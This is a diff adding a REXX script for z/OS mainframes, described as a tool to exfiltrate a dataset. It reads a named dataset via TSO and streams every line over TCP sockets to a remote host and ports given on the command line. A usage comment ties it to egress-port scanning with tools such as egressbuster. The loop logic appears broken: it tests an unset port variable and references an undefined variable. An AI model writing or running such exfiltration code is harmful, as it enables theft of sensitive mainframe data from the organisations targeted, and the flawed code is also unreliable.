@@ -1,0 +1,46 @@
+/* REXX */
+/* DSNEXFIL = Using rexx to exfil a dataset */
+
+/* Usage: Use ps.java and egressbuster to identify potential ports  */
+/* for exfil, then use this script to exfil data over those port(s) */
+/* EX 'hlq.rexxlib(exfil)' 'file.to(exfil) 3.1.33.7 80 443 8080'    */
+
+PARSE ARG INDD HOST PORTS
+skip_unformatted = 1
+Say "*** Opening" INDD
+
+address tso "alloc file(input) dataset('"INDD"') SHR"
+
+if RC \= 0 then do
+   say '*** ! Error allocating file' INDD
+   return
+end
+address tso "execio * diskr input (stem input. finis)"
+address tso "free file(input)"
+
+say "*** Read" input.0 "lines"
+
+do while length(port) > 0
+  parse var port ports
+  say '*** Connecting to' host ||":"||port
+  sock = SOCKET('INITIALIZE','CLIENT',2);
+  sock = SOCKET('SOCKET',2,'STREAM','TCP');
+  parse var sock socket_rc socketID .
+  if socket_rc <> 0 then do
+    say '*** ! Error ! Socket FAILED with info:' sock
+    sock = SOCKET('TERMINATE')
+    exit 1
+  end
+  sock = Socket('SETSOCKOPT',socketID,'SOL_SOCKET','SO_KEEPALIVE','ON')
+  sock = SOCKET('SETSOCKOPT',socketID,'SOL_SOCKET','SO_ASCII','On')
+  sock = SOCKET('CONNECT',socketID,'AF_INET' port host)
+  parse var sock connect_rc rest
+  if connect_rc <> 0 then do
+    say '[!] Connection Failed:' terp
+    exit 1
+  end
+  do i = 1 to input.0
+    sock = SOCKET('SEND',socketID,input.i||'25'x)
+  end
+  sock = SOCKET('CLOSE',socketID)
+end
